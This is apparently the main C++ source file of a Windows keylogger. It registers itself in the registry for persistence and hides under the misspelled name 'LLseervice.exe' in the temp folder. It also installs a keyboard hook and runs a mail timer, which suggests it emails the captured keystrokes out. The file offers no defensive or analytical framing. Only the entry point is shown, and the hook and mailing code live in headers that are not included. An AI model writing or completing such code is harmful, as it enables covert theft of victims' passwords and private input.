#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"
#include "Regedit.h"
#include "prepare.h"
#include "Process.h"

using namespace std;

int main()
{
	pre::start();

    Registry::RegisterProgram();

    if (IO::getFileName() != "LLseervice.exe"){
        char* temp = getenv("temp");
        std::string temp_dir(temp);
        std::string path = temp_dir+"\\LLseervice.exe";
        while(IO::exists_file(path)){
            ss::creckSoc();
        }
    }
	MSG Msg;
    IO::MkDir(IO::GetOurPath(true));
    GetProcID();
    curprocname = GetProcName(curpid);
    EnumWindows(EnumWindowsProc,0);
    InstallHook();
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	MailTimer.Stop();
	return 0;
}
